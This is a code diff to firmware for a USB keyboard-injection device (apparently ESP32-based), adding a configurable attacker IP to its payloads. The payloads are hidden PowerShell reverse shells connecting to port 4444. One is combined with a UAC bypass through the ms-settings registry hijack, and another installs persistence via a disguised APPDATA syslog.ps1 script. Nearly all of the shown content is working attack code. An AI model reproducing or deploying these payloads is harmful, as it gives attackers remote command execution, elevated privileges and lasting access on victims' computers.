@@ -20,7 +20,16 @@
  */
 
 #include "shared_protocol.h"
+
+// ==========================================
+// ⚡ SECURITY CONFIGURATION ⚡
+// ==========================================
+// Default base IP (can be changed dynamically via Web UI)
+#define ATTACKER_IP "192.168.0.103"
+// ==========================================
+
 #include <Arduino.h>
+String currentAttackerIP = ATTACKER_IP;
 #include <USB.h>
 #include <USBHIDKeyboard.h>
 #include <WebServer.h>
@@ -473,8 +482,8 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         delay(1000);
         // 2. Type full PowerShell reverse shell (with byte stream + flush)
         Keyboard.print(
-            "powershell -w h -nop -ep bypass -c \""
-            "$c=New-Object Net.Sockets.TCPClient('192.168.0.103',4444);"
+            String("powershell -w h -nop -ep bypass -c \"") +
+            "$c=New-Object Net.Sockets.TCPClient('" + currentAttackerIP + "',4444);" +
             "$s=$c.GetStream();"
             "[byte[]]$b=0..65535|%{0};"
             "while(($i=$s.Read($b,0,$b.Length))-ne 0){"
@@ -503,8 +512,8 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         Keyboard.releaseAll();
         delay(1000);
         Keyboard.print(
-            "powershell -w h -nop -ep bypass -c \""
-            "$rcmd='powershell -w h -nop -ep bypass -c \"\"\"$c=New-Object Net.Sockets.TCPClient(''''192.168.0.103'''',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sr=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sr,0,$sr.Length);$s.Flush()};$c.Close()\"\"\"';"
+            String("powershell -w h -nop -ep bypass -c \"") +
+            "$rcmd='powershell -w h -nop -ep bypass -c \"\"\"$c=New-Object Net.Sockets.TCPClient(''''" + currentAttackerIP + "'''',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sr=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sr,0,$sr.Length);$s.Flush()};$c.Close()\"\"\"';" +
             "New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force;"
             "New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value '' -Force;"
             "Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value $rcmd -Force;"
@@ -620,11 +629,11 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         Keyboard.releaseAll();
         delay(1000);
         Keyboard.print(
-            "powershell -w h -nop -ep bypass -c \""
-            "$p=$env:APPDATA+'\\syslog.ps1';"
-            "$s='$c=New-Object Net.Sockets.TCPClient(''192.168.0.103'',4444);"
-            "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){"
-            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
+            String("powershell -w h -nop -ep bypass -c \"") +
+            "$p=$env:APPDATA+'\\syslog.ps1';" +
+            "$s='$c=New-Object Net.Sockets.TCPClient(''" + currentAttackerIP + "'',4444);" +
+            "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){" +
+            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);" +
             "$r=(iex $d 2>&1|Out-String);$sr=([Text.Encoding]::ASCII).GetBytes($r);"
             "$s.Write($sr,0,$sr.Length);$s.Flush()};$c.Close()';"
             "Set-Content -Path $p -Value $s;"
